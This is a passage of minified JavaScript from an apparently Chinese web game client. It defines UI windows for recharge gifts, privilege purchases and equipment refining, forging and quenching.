n=i(1),o=i(0),s=i(492),a=i(25),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="AutoPrivilegeSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.closeBtn,this.onClick),this.lstAuto.itemRenderer=s.AutoPrivilegeItemRender,observe(this,this.updata,a.Recharge.ins().postAutoPrivilege)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updata()},e.prototype.updata=function(){var t=o.GlobalConfig.PrivilegeData.privilegeGuaji,e=[],i=a.Recharge.ins().AutoPrivilegeTime;for(var n in t)e.length<3&&e.push(t[n]);-1==i?e.push(t[4]):0==i?e.push(t[3]):i>0?e.push(t[3]):-2==i&&e.push(t[3]),this.lstAuto.dataProvider=new eui.ArrayCollection(e)},e.prototype.onClick=function(){win.close(this)},e.openCheck=function(){return!window.platform.isshen()},e}(n.BaseView);e.AutoPrivilegeWin=r,window.AutoPrivilegeWin=r,__reflect(r.prototype,"AutoPrivilegeWin",[]),window.AutoPrivilegeWin=r},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Recharge1Win=void 0;var n=i(1),o=i(0),s=i(11),a=i(2),r=i(25),l=i(13),h=i(6),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="FirstChargeSkin",e.tabIdx=0,e.tabDayIdx=1,e.listArr=[],e.showItem=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.elist.itemRenderer=s.ItemBase,this.elist.dataProvider=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,r.Recharge.ins().getRecharge1WinInfo),observe(this,this.listRp,r.Recharge.ins().getRecharge1WinInfo),this.addTouchEvent(this.btn0,this.onTouch),this.addTouchEvent(this.btn1,this.onTouch),this.addTouchEvent(this.closeBtn,this.onTouch),this.addTouchEvent(this.eDayTab,this.onClickTab),this.addTouchEvent(this.eTab1,this.onClickTab2),this.initList(),this.updateView(),this.listRp()},e.prototype.onTouch=function(t){switch(t.target){case this.btn0:win.open("RechargeShowWin");break;case this.btn1:var e=this.listArr[this.tabIdx][this.tabDayIdx],i=r.Recharge.ins().recharge1WinInfoDic[e.index][this.tabDayIdx].type;if(1!=i)return void a.TipsCT.ins().showTips(gettext("第{0}天可领取",e.day));var n=h.BagCT.ins().rockonNeedNum(this.showItem);if(n&&h.BagCT.ins().getAllSurplusCount(0)<=0)return void a.TipsCT.ins().showTips(gettext("请先清理背包或扩容"));var o=e.index,s=r.Recharge.ins().recharge1WinInfoDic[o][this.tabDayIdx].day;r.Recharge.ins().sendNewRecycle(o,s);break;case this.closeBtn:win.close(this)}},e.prototype.onClickTab2=function(){this.tabIdx!=this.eTab1.selectedIndex&&(this.tabIdx=this.eTab1.selectedIndex,this.tabDayIdx=1,this.eDayTab.selectedIndex=this.tabDayIdx-1,this.updateView())},e.prototype.onClickTab=function(){this.tabDayIdx!=this.eDayTab.selectedIndex+1&&(this.tabDayIdx=this.eDayTab.selectedIndex+1,this.updateView())},e.prototype.initList=function(){this.listArr=[];var t=o.GlobalConfig.RechargeBigGiftBagConfig;for(var e in t)this.listArr.push(t[e])},e.prototype.updateView=function(){this.showItem=[];var t=this.listArr[this.tabIdx][this.tabDayIdx];if(t){this.showItem=t["award_"+l.SubRoles.ins().getSubRoleByIndex(0).job]||[],this.elist.dataProvider=new eui.ArrayCollection(this.showItem),this.num1.text=""+t.index,this.num2.text=""+t.num1;var e=r.Recharge.ins().recharge1WinInfoDic[t.index][this.tabDayIdx].type;this.btn0.visible=r.Recharge.ins().recharge1WinNum<t.index,this.btn1.visible=!this.btn0.visible&&1==e,this.tipLab.text=this.btn0.visible||0!=e?"":gettext("第{0}天可领取",t.day),this.getLab.visible=""==this.tipLab.text,this.updatetabRp()}},e.prototype.listRp=function(){this.updatetabRp();var t=r.Recharge.ins().recharge1WinInfoDic,e=0;this.eTab1.validateNow();for(var i in t){var n=this.eTab1.getElementAt(e);if(!n)return;n.eRp.visible=r.Recharge.ins().checkKeyRp(i),e++}},e.prototype.updatetabRp=function(){var t=this.listArr[this.tabIdx],e=0;this.eDayTab.validateNow();for(var i in t){var n=this.eDayTab.getElementAt(e);if(!n)return;n.eRp.visible=1==r.Recharge.ins().recharge1WinInfoDic[t[i].index][i].type,e++}},e}(n.BaseView);e.Recharge1Win=u,window.Recharge1Win=u,__reflect(u.prototype,"Recharge1Win",[]),window.Recharge1Win=u},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RechargeTQIItem=e.RechargeTQTip=void 0;var n=i(66),o=i(5),s=i(3),a=i(1),r=i(0),l=i(25),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="AutoPrivilegeSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.closeBtn,this.onClick),this.lstAuto.itemRenderer=u},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=[],n=r.GlobalConfig.PrivilegeData[""+t[0]];if(n){this.title.source=n.title||"";var o=n.ridList||[];for(var s in o)i.push({row:o[s],conid:t[0]});this.lstAuto.dataProvider=new eui.ArrayCollection(i)}},e.prototype.onClick=function(t){switch(t.target){case this.closeBtn:win.close(this)}},e}(a.BaseView);e.RechargeTQTip=h,window.RechargeTQTip=h,__reflect(h.prototype,"RechargeTQTip",[]);var u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.addTouchEvent(this.btnBuy,this.onClick)},e.prototype.dataChanged=function(){var t=this.data.row;this.showImg.source=t.img;var e=t.rid;this.btnBuy.label=r.GlobalConfig.RechargeConfig[e]?n.PayUtils.getPayUnitStr(r.GlobalConfig.RechargeConfig[e].cash/100,urlParam.payUnit):gettext("购买"),this.showName.text=t.showName?t.showName:"",this.descValue=t.desc?t.desc:"",this.lbDesc.textFlow=o.TextFlowMaker.generateTextFlow(this.descValue),this.lbGot.visible=!1,this.btnBuy.visible=!0,this.data.row.good?this.Good.visible=!0:this.Good.visible=!1},e.prototype.onClick=function(){var t=this.data.row.rid;l.Recharge.ins().sendPayOrder(t),win.close("RechargeTQTip")},e}(s.BaseItemRender);e.RechargeTQIItem=u,window.RechargeTQIItem=u,__reflect(u.prototype,"RechargeTQIItem",[]),window.RechargeTQIItem=u,window.RechargeTQTip=h},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipClearWin=void 0;var n=i(0),o=i(57),s=i(38),a=i(262),r=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){t.prototype.skinComplete.call(this),this.useYb.label=gettext("洗练石不足，元宝自动购买洗练石"),this.btnClear.label=gettext("开始洗练"),this.lab.text=gettext("可洗炼属性一览"),this.lab1.text=gettext("洗炼属性"),this.talkLab.text=gettext("洗练说明"),this.StrArr=[gettext("洗练"),gettext("洗练石")],this.StrArr1=[gettext("洗练消耗")],this.PanelType=o.PANEL_TYPE.Clear,this.inItData()},e.prototype.inItData=function(){this.MsgCbDic={info:s.EquipCT.ins().postEquipClearInfo,update:s.EquipCT.ins().postEquipClear},this.CfgDic={AffixCfg:n.GlobalConfig.EquipAffixConfig,AffixBaseCfgCost:n.GlobalConfig.EquipAffixBaseConfig.costItemId,AffixCostCfg:n.GlobalConfig.EquipAffixCostConfig,HelpCfg:n.GlobalConfig.HelpInfoConfig[3],StoreCfg:n.GlobalConfig.ItemStoreConfig[17],HelpCfg2:n.GlobalConfig.HelpInfoConfig[209]},this.keepArr=s.EquipCT.ins().extAttrs,this.quilyArr=s.EquipCT.ins().quily},e.prototype.updateData=function(){void 0!=s.EquipCT.ins().clearTab&&(this.IdxTab=s.EquipCT.ins().clearTab),void 0!=s.EquipCT.ins().clearEquipUid&&(this.IdxEquipUid=s.EquipCT.ins().clearEquipUid),this.keepArr=s.EquipCT.ins().extAttrs,this.quilyArr=s.EquipCT.ins().quily},e.prototype.CleanData=function(){this.keepArr=s.EquipCT.ins().extAttrs=[],this.quilyArr=s.EquipCT.ins().quily=[]},e.prototype.rpcInfo=function(t,e){s.EquipCT.ins().sendEquipClearInfo(t,[e])},e.prototype.rpcChange=function(t,e,i,n,o){s.EquipCT.ins().sendEquipClear(t,e,i,n,o)},e.prototype.rpcSave=function(t,e){s.EquipCT.ins().sendSaveEquip(t,e)},e}(a.EquipClearPanel);e.EquipClearWin=r,window.EquipClearWin=r,__reflect(r.prototype,"EquipClearWin",[]),window.EquipClearWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipDuanPoWin=void 0;var n=i(1),o=i(38),s=i(6),a=i(156),r=i(31),l=i(10),h=i(0),u=i(48),p=i(5),d=i(22),c=i(27),f=i(201),g=i(76),m=i(495),v=i(493),y=i(110),C=i(58),T=i(2),b=i(15),w=i(12),I=i(67),_=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.beforeIndex=0,e.equipBagIndex=-1,e.isUseYb=0,e.lock1=0,e.lock2=0,e.costTimes=1,e._IdxEquipUid=0,e._hasDuanPoAttr=!1,e._canLockSkill=!1,e.init1=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.tabEquip.itemRenderer=a.TabClearItemRender,this.eTab.itemRenderer=f.EquipClearItem,this._duanPoAttrPreArr=new eui.ArrayCollection,this.duanPoAttrList.itemRenderer=m.DuanPoItem,this.duanPoAttrList.dataProvider=this._duanPoAttrPreArr,this.costCmlist.itemRenderer=y.CostComRender,this._curCostArr=new eui.ArrayCollection,this.costCmlist.dataProvider=this._curCostArr},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateChangeTab,o.EquipCT.ins().postDuanPoAttrSave),observe(this,this.updateChangeTab,s.BagCT.ins().postInclidentAttr),observe(this,this.updateChangeTab,o.EquipCT.ins().postChangeTabClear),observe(this,this.updateView,o.EquipCT.ins().postDuanPoTempAttrFlus),this._costArr=h.GlobalConfig.EquipAffixBaseConfig.forgeSoulCost,this._costArr1=h.GlobalConfig.EquipAffixBaseConfig.forgeSoulFirstCost,this._costArr2=h.GlobalConfig.EquipAffixBaseConfig.forgeSoulSkillCost,this.addTouchEvent(this.btnClear,this.onClick),this.addTouchEvent(this.btnClear0,this.onClick),this.addTouchEvent(this.btnPreserve,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.addTouchEvent(this.btnHelp2,this.onClick),this.addTouchEvent(this.btnSuit,this.onClick),this.lstLock.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onlstLock,this),this.addChangeEvent(this.btnLockSkill,this.lockDuanPoSkillClick),this.eTab.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onChangeTab,this),this.tabEquip.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemTap,this),this.btnLockSkill.selected=!1,this.tabEquip.dataProvider=this.tabEquipAC=new eui.ArrayCollection([]),this.lstLock.dataProvider=this._lockAc=new eui.ArrayCollection([]),this.cleanlockView(),this._IdxTab||(this._IdxTab=0),this.eTab.selectedIndex=this._IdxTab||0,this.updateChangeTab(),this.tabEquipAC.source.length>0&&(this.setTabEquipSel(0),this.changetabEquip())},e.prototype.setTabEquipSel=function(t){this.tabEquip.selectedIndex=t;for(var e=0,i=this.tabEquip.numChildren;i>e;e++){var n=this.tabEquip.getChildAt(e);n&&(n.currentState=t==e?"down":"up")}this.updateView()},e.prototype.sortDuanPoId=function(t,e){return e-t},e.prototype.getCurAttrDesc=function(t){var e="",i=h.GlobalConfig.EquipAffixBaseConfig.forgeSoulCount;if(!t||!t.equipDuanPoPro||!t.equipDuanPoPro.proArr||0==t.equipDuanPoPro.proArr.length){for(var n=0;i>n;n++)e+=0==n?gettext("属性：未鉴定"):"\n\n"+gettext("属性：未鉴定");return e}var o=t.equipDuanPoPro.proArr;o=o.sort(this.sortDuanPoId.bind(this));var s=0;for(var a in o){var r=o[a],l=h.GlobalConfig.ForgeSoulReviseConfig[r];l&&(e+=0==s?C.LangUtils.formatStr(l.desc,[l.value]):"\n\n"+C.LangUtils.formatStr(l.desc,[l.value])+" ",s++)}var u=i-s;if(u>=1)for(var n=0;u>n;n++)e+="\n\n"+gettext("属性：未鉴定");return""==e?null:e},e.prototype.getTempDuanPoAttr=function(){if(!o.EquipCT.ins().tempDuanPoPro||0==o.EquipCT.ins().tempDuanPoPro.skillId||!o.EquipCT.ins().tempDuanPoPro.proArr||0==o.EquipCT.ins().tempDuanPoPro.proArr.length)return null;var t="",e=0,i=o.EquipCT.ins().tempDuanPoPro.proArr;i=i.sort(this.sortDuanPoId.bind(this));for(var n in i){var s=i[n],a=h.GlobalConfig.ForgeSoulReviseConfig[s];a&&(t+=0==e?C.LangUtils.formatStr(a.desc,[a.value]):"\n\n"+C.LangUtils.formatStr(a.desc,[a.value])+" ",e++)}return""==t?null:t},e.prototype.getTempDuanPoDesc=function(){if(!o.EquipCT.ins().tempDuanPoPro||!o.EquipCT.ins().tempDuanPoPro.skillId||!this._curSelItemData)return null;var t=this.btnLockSkill.selected?this._curSelItemData.extAttQuality[0]:this._curSelItemData.equipDuanPoPro.preId,e=1==t?gettext("(增幅)"):gettext("(抵抗)"),i=1e3*o.EquipCT.ins().tempDuanPoPro.skillId+1,n=h.GlobalConfig.SkillsConfig[i];if(n){var s=h.GlobalConfig.SkillsDescConfig[n.desc];return s?""+s.name+e:null}return null},e.prototype.updateView=function(){if(this._resultData){var t=this.tabEquip.selectedIndex<=-1?0:this.tabEquip.selectedIndex,e=this._resultData[t];if(this._curSelItemData=e,!e){this.tabEquip.dataProvider=this.tabEquipAC=new eui.ArrayCollection([]),this.item.data=null,this.item.clearIcon(),this.item.clearTiSheng(),this.costYb.text="",this.costStone.text="",this.ql.text="",this.type.text="",this.job.text="",this.lv.text="",this.nowAttr.text="",this.nowSkillAttr.text="",this.clearAttr.text="",this.clearSkillAttr.text="",this.power.text="",this.isUseYb=0,this._lockAc.replaceAll([]),this.btnClear.enabled=!1,this.btnClear0.enabled=!1,this.btnPreserve.enabled=!1,this.btnClear0.visible=!0,this.btnClear.visible=!1,this.btnPreserve.visible=!1;var i=[];for(var n in this._costArr)i.push({cost:{type:this._costArr[n].type,id:this._costArr[n].id,count:1},isShowHas:!0,isShowXh:!0});return void this._curCostArr.replaceAll(i)}if(this.btnClear.enabled=!0,this.btnClear0.enabled=!0,this.btnPreserve.enabled=!0,this.costCmlist.visible=!0,this._hasDuanPoAttr=!1,e.equipDuanPoPro&&e.equipDuanPoPro.proArr&&e.equipDuanPoPro.proArr.length>0){var s=0;for(var n in e.equipDuanPoPro.proArr)e.equipDuanPoPro.proArr[n]>0&&s++;this._hasDuanPoAttr=s>=h.GlobalConfig.EquipAffixBaseConfig.forgeSoulCount}this.btnPreserve.visible=this.btnClear.visible=this._hasDuanPoAttr,this.btnClear0.visible=!this._hasDuanPoAttr;h.GlobalConfig.EquipConfig[e.configID];this._canLockSkill=this._hasDuanPoAttr,this.btnLockSkill.visible=this._hasDuanPoAttr,this._canLockSkill||(this.btnLockSkill.selected=!1);var a=[];if(this.btnLockSkill.selected)for(var n in this._costArr2)a.push({cost:{type:this._costArr2[n].type,id:this._costArr2[n].id,count:this._costArr2[n].count},isShowHas:!0,isShowXh:!0});else if(this._hasDuanPoAttr)for(var n in this._costArr)a.push({cost:{type:this._costArr[n].type,id:this._costArr[n].id,count:this._costArr[n].count},isShowHas:!0,isShowXh:!0});else for(var n in this._costArr1)a.push({cost:{type:this._costArr1[n].type,id:this._costArr1[n].id,count:this._costArr1[n].count},isShowHas:!0,isShowXh:!0});this._curCostArr.replaceAll(a),this.onCheck(),this.item.data=e;var d=r.QUALITY_NAME[e.quality],c=l.ItemUtil.getQualityColor(e.quality);this.ql.textFlow=p.TextFlowMaker.generateTextFlow(gettext("品质:|C:{0}&T:{1}|",c,d));var f=h.GlobalConfig.ItemConfig[e.configID],g=l.ItemUtil.getSubType(f),m=u.Role.getEquipNameByType(g);this.type.textFlow=p.TextFlowMaker.generateTextFlow(gettext("类型:|C:0xFFFFFF&T:{0}|",m));var v=l.ItemUtil.getJob(f);this.job.textFlow=p.TextFlowMaker.generateTextFlow(gettext("职业:|C:0xFFFFFF&T:{0}|",u.Role.getJobNameByJob(v))),this.lv.textFlow=p.TextFlowMaker.generateTextFlow(gettext("等级:|C:0x00FF00&T:{0}{1}级|",f.zsLevel>0?f.zsLevel+gettext("转"):"",f.level||1));var y=o.EquipCT.ins().getDuanPoPreAttrList(e);this._duanPoAttrPreArr.replaceAll(y),this.nowAttr.textFlow=p.TextFlowMaker.generateTextFlow(this.getCurAttrDesc(e)),this.nowSkillAttr.textFlow=p.TextFlowMaker.generateTextFlow(o.EquipCT.ins().getCurSkillDesc(e)),this.power.text=gettext("战力:")+e.point,this._keepArr=o.EquipCT.ins().tempDuanPoPro&&o.EquipCT.ins().tempDuanPoPro.proArr?o.EquipCT.ins().tempDuanPoPro.proArr:[];var C=this.getTempDuanPoAttr(),T=this.getTempDuanPoDesc();this.clearAttr.textFlow=p.TextFlowMaker.generateTextFlow(C),this.clearSkillAttr.textFlow=p.TextFlowMaker.generateTextFlow(T);var b=1==this.eTab.selectedIndex;this.equipBagIndex=b?-1:e.subType2,this.lstLock.validateNow(),this.setItemAtt(e)}},e.prototype.setItemAtt=function(t){for(var e=t?d.AttributeData.getAttrNum2(t.supExtAtt):0,i=[],n=0;e>n;n++){var o={};i.push(o)}this._lockAc.replaceAll(i)},e.prototype.updateTab=function(){var t,e,i;if(!(this.tabEquip.numElements<this.beforeIndex)){var n=this.tabEquip.getElementAt(this.beforeIndex);n&&(null===(t=n.item)||void 0===t?void 0:t.setLock(null===(i=null===(e=n.item)||void 0===e?void 0:e.data)||void 0===i?void 0:i.lock)),this.setTabEquipSel(this.beforeIndex);var o=this._resultData[this.tabEquip.selectedIndex];o&&(this.item.data=o)}},e.prototype.onItemTap=function(t){var e=this;this.tabEquip.selectedIndex!=this.beforeIndex&&(0!=this._keepArr.length?(this.tabEquip.selectedIndex=this.beforeIndex,this.setTabEquipSel(this.beforeIndex),c.WarnWin.show(gettext("当前属性未保存，是否确认放弃?"),function(){o.EquipCT.ins().tempDuanPoPro={skillId:0,preId:0,proArr:[]},e._keepArr=[],e.beforeIndex=t.itemIndex,e.btnLockSkill.selected=!1,e.setTabEquipSel(e.beforeIndex),e.changetabEquip()},this)):(this.btnLockSkill.selected=!1,this.beforeIndex=t.itemIndex,this.setTabEquipSel(this.beforeIndex),this.changetabEquip()))},e.prototype.reckonIdx=function(){var t;if(this.tabEquip.selectedIndex>0||this.beforeIndex)return this.tabEquip.selectedIndex||this.beforeIndex;if(!this._IdxEquipUid)return 0;for(var e=0;e<(null===(t=this._resultData)||void 0===t?void 0:t.length);e++)if(this._resultData[e].handle==this._IdxEquipUid)return e;return 0},e.prototype.reckonScV=function(){var t,e,i;if(!(null===(t=this._resultData)||void 0===t?void 0:t.length))return 0;var n=this.tabEquip.height,o=118,s=Math.floor(n/o);if(this.tabEquip.validateNow(),this._resultData.length<=s||this.tabEquip.selectedIndex<=s)return 0;var a=this.tabEquip.selectedIndex*o;return(null===(e=this._resultData)||void 0===e?void 0:e.length)-this.tabEquip.selectedIndex<s&&(a-=(s-((null===(i=this._resultData)||void 0===i?void 0:i.length)-this.tabEquip.selectedIndex))*o),a},e.prototype.onlstLock=function(t){this.lstLock.selectedItems.length>2&&(this.lstLock.selectedIndices.pop(),this.lstLock.selectedItems.pop());var e=this.lstLock.selectedIndices.length;switch(e){case 0:this.lock1=0,this.lock2=0;break;case 1:this.lock1=this.lstLock.selectedIndices[0]+1,this.lock2=0;break;case 2:this.lock1=this.lstLock.selectedIndices[0]+1,this.lock2=this.lstLock.selectedIndices[1]+1}this.costTimes=e+1,this.lstLock.validateNow(),this.onCheck()},e.prototype.cleanlockView=function(){this.lstLock.selectedIndices=[],this.lstLock.selectedItems=[],this.lock1=0,this.lock2=0,this._lockAc.replaceAll([]),this.costTimes=1},e.prototype.changetabEquip=function(){this.cleanlockView();this._resultData[this.tabEquip.selectedIndex]},e.prototype.onCheck=function(){},e.prototype.onCheckSoul=function(){},e.prototype.onChangeTab=function(t){var e=this;this.beforeIndex=0,this.tabEquip.selectedIndex=0,this._IdxTab!=t.itemIndex&&(this.eTab.selectedIndex=this._IdxTab,this.init1=!0,this._keepArr&&0!=this._keepArr.length?c.WarnWin.show(gettext("当前属性未保存，是否确认放弃?"),function(){e._IdxTab=t.itemIndex,e.eTab.selectedIndex=e._IdxTab,o.EquipCT.ins().tempDuanPoPro={skillId:0,preId:0,proArr:[]},e._keepArr=[],e.updateChangeTab()},this):(this._IdxTab=t.itemIndex,this.eTab.selectedIndex=this._IdxTab,this.cleanlockView(),this.updateChangeTab()))},e.prototype.updateChangeTab=function(){this._resultData=[];var t,e=o.EquipCT.ins().getDuanPoEquipList(this.eTab.selectedIndex);if(this._resultData=e,this.tabEquipAC.replaceAll(this._resultData),this.init1&&(this.init1=!1,this.tabSc.validateNow(),this.setTabEquipSel(this.beforeIndex=this.reckonIdx()||0),this.tabSc.viewport.scrollV=this.reckonScV()||0),this.tabSc.viewport.scrollV&&this.tabEquip.selectedIndex<=0&&(this.tabSc.viewport.scrollV=0),this._resultData&&0!=this._resultData.length){-1==this.tabEquip.selectedIndex?this.setTabEquipSel(0):this.setTabEquipSel(this.tabEquip.selectedIndex),t=this._resultData[this.tabEquip.selectedIndex];var i=0==this.eTab.selectedIndex;this.equipBagIndex=i?-1:t.subType2}this.updateView()},e.prototype.lockDuanPoSkillClick=function(){if(o.EquipCT.ins().tempDuanPoPro.skillId>0){var t=[];if(this.btnLockSkill.selected)for(var e in this._costArr2)t.push({cost:{type:this._costArr2[e].type,id:this._costArr2[e].id,count:this._costArr2[e].count},isShowHas:!0,isShowXh:!0});else if(this._hasDuanPoAttr)for(var e in this._costArr)t.push({cost:{type:this._costArr[e].type,id:this._costArr[e].id,count:this._costArr[e].count},isShowHas:!0,isShowXh:!0});else for(var e in this._costArr1)t.push({cost:{type:this._costArr1[e].type,id:this._costArr1[e].id,count:this._costArr1[e].count},isShowHas:!0,isShowXh:!0});return void this._curCostArr.replaceAll(t)}return this._canLockSkill?void this.updateView():(this.btnLockSkill.selected=!1,void T.TipsCT.ins().showTips(gettext("三星及以上星王装备才可锻魄技能")))},e.prototype.checkPreAndSkillIsMatch=function(t,e){return!1},e.prototype.onClick=function(t){var e,i,n=this._resultData[this.tabEquip.selectedIndex];switch(t.currentTarget){case this.btnClear:case this.btnClear0:if(this.btnLockSkill.selected){if(!this._costArr2||0==this._costArr2.length||!n)return;if(!s.BagCT.ins().isConsumeEnough(this._costArr2,s.BagCT.BAG_TYPE_OTHTER,!0,!0))return}else if(this._hasDuanPoAttr){if(!this._costArr||0==this._costArr.length||!n)return;if(!s.BagCT.ins().isConsumeEnough(this._costArr,s.BagCT.BAG_TYPE_OTHTER,!0,!0))return}else{if(!this._costArr1||0==this._costArr1.length||!n)return;if(!s.BagCT.ins().isConsumeEnough(this._costArr1,s.BagCT.BAG_TYPE_OTHTER,!0,!0))return}o.EquipCT.ins().reqEquipDuanPo(n.handle,this.btnLockSkill.selected?1:0);break;case this.btnPreserve:if(!this._keepArr.length||!n)return;o.EquipCT.ins().reqEquipDuanPoSave(n.handle);break;case this.btnHelp:win.open(g.CommonHelpWin,(null===(e=h.GlobalConfig.HelpInfoConfig[317])||void 0===e?void 0:e.text)||"");break;case this.btnHelp2:win.open(g.CommonHelpWin,(null===(i=h.GlobalConfig.HelpInfoConfig[318])||void 0===i?void 0:i.text)||"");break;case this.btnSuit:win.open(v.EquipDuanPoSuitWin)}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=w.OpenSystem.ins().checkSysOpen(b.SystemType.EquipDuanPo);return i||(T.TipsCT.ins().showTips(w.OpenSystem.ins().getNoOpenTips(b.SystemType.EquipDuanPo)),win.open(I.View_BianQiang,2)),i},__decorate([delayCall(100)],e.prototype,"setTabEquipSel",null),__decorate([delayCall(100)],e.prototype,"updateChangeTab",null),e}(n.BaseView);e.EquipDuanPoWin=_,window.EquipDuanPoWin=_,__reflect(_.prototype,"EquipDuanPoWin",[]),window.EquipDuanPoWin=_},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipQuenchingPanel=void 0;var n=i(19),o=i(5),s=i(1),a=i(0),r=i(39),l=i(36),h=i(15),u=i(4),p=i(48),d=i(6),c=i(31),f=i(40),g=i(10),m=i(67),v=i(12),y=i(38),C=i(2),T=i(27),b=i(496),w=i(156),I=i(497),_=i(201),S=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="EquipQuenchingSkin",e.datas=[],e.costDatas=[],e.choiceLockArr=[],e.IdxTab=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.tabItem.itemRenderer=w.TabClearItemRender,this.listItem.itemRenderer=I.TabQuenchingItemRender,this.nowAttrList.itemRenderer=this.nextAttrlist.itemRenderer=b.EquipClearAttrItem,this.eTab.itemRenderer=_.EquipClearItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(observe(this,this.updateView,y.EquipCT.ins().postQuenching),observe(this,this.keepCb,y.EquipCT.ins().postEquipChange),observe(this,this.keepCb,d.BagCT.ins().postInclidentAttr),observe(this,this.updateView,y.EquipCT.ins().postGiveUp),this.eTab.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onChangeBagEquip,this),this.tabItem.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.changeEquipTab,this),this.addTouchEvent(this.btnQuenching,this.onClick),this.addTouchEvent(this.btnHightQuenching,this.onClick),this.addTouchEvent(this.btnGiveUp,this.onClick),this.addTouchEvent(this.btnPolish,this.onClick),this.addTouchEvent(this.btnSave,this.onClick),this.addTouchEvent(this.btnOrdinarySave,this.onClick),this.addTouchEvent(this.btnOrdinaryGiveUp,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.addTouchEvent(this.nowAttrList,this.attrItemClick),this.addTouchEvent(this.resetBtn,this.onClick),y.EquipCT.ins().isQuenching=0,this.listItem.dataProvider=this.listItemArrayCollection=new eui.ArrayCollection([]),this.tabItem.dataProvider=this.tabArrayCollection=new eui.ArrayCollection([]),this.nowAttrList.dataProvider=this.nextAttrlist.dataProvider=new eui.ArrayCollection([]),this.bagOrBody=this.eTab.selectedIndex=0,this.tabIndex=0,this.tabItem.selectedIndex=0,this.choiceLockArr=[],this.updateTabItem(),this.updateitemInfoGp(),this.updateAttrGp(),this.updateLstLock(),this.curData=this.datas[this.tabIndex],this.curData){var i=this.bagOrBody?-1:this.curData.subType2;y.EquipCT.ins().sendQuenchingInfo(this.curData.handle,i)}else this.updateQuechingAttr(),this.updateBtnGp(),this.updateCostBestGp()},e.prototype.updateView=function(){if(this.updateTabItem(),0==y.EquipCT.ins().isQuenching){this.updateAttrGp();var t=this.datas[this.tabIndex];this.item.data=t}this.updateitemInfoGp(),this.updateQuechingAttr(),this.updateCostBestGp(),this.updateBtnGp(y.EquipCT.ins().isQuenching),this.updateLstLock()},e.prototype.keepCb=function(){y.EquipCT.ins().isQuenching=0,y.EquipCT.ins().quenchingAttr=[],this.updateView(),this.updateLstLock()},e.prototype.updateTabItem=function(){this.datas=[];var t=[];t=0==this.bagOrBody?y.EquipCT.ins().getAllBodyBestEquip():y.EquipCT.ins().getAllBestEquip();for(var e=0;e<t.length;e++)g.ItemUtil.isMasterEquip(t[e].itemConfig)||this.datas.push(t[e]);this.tabArrayCollection.replaceAll(this.datas);var i=0;if(this.curData&&this.datas.length)for(var e=0;e<this.datas.length;e++)if(this.datas[e].handle==this.curData.handle){i=e;break}this.tabIndex=this.tabItem.selectedIndex=i,this.tabSc.viewport.scrollV&&this.tabItem.selectedIndex<=0&&(this.tabSc.viewport.scrollV=0)},e.prototype.updateitemInfoGp=function(){0==this.datas.length?this.lbNoBestEquip.visible=!0:this.lbNoBestEquip.visible=!1;var t=this.datas[this.tabIndex];if(!t)return void(this.itemInfoGp.visible=!1);this.itemInfoGp.visible=!0;var e=t.itemConfig;this.item.data=t,this.power.text=gettext("战力:{0}",t.point);var i=g.ItemUtil.getSubType(e),n=p.Role.getEquipNameByType(i);this.type.textFlow=o.TextFlowMaker.generateTextFlow(gettext("类型:|C:0xFFFFFF&T:{0}|",n));var s=g.ItemUtil.getJob(e);this.job.textFlow=o.TextFlowMaker.generateTextFlow(gettext("职业:|C:0xFFFFFF&T:{0}|",p.Role.getJobNameByJob(s))),this.lv.textFlow=o.TextFlowMaker.generateTextFlow(gettext("等级:|C:0x40df38&T:{0}{1}级|",e.zsLevel>0?e.zsLevel+gettext("转"):"",e.level||1));var a=c.QUALITY_NAME[t.quality],r=g.ItemUtil.getQualityColor(t.quality);this.ql.textFlow=o.TextFlowMaker.generateTextFlow(gettext("品质:|C:{0}&T:{1}|",r,a))},e.prototype.updateCostBestGp=function(){var t=this.datas[this.tabIndex];if(!t)return void(this.costBestGp.visible=!1);this.costBestGp.visible=!0,this.costDatas=[];for(var e=y.EquipCT.ins().getAllBestEquip(),i=y.EquipCT.ins().getBestNum(t.att),n=0;n<e.length;n++){var o=e[n],s=y.EquipCT.ins().getBestNum(o.att);
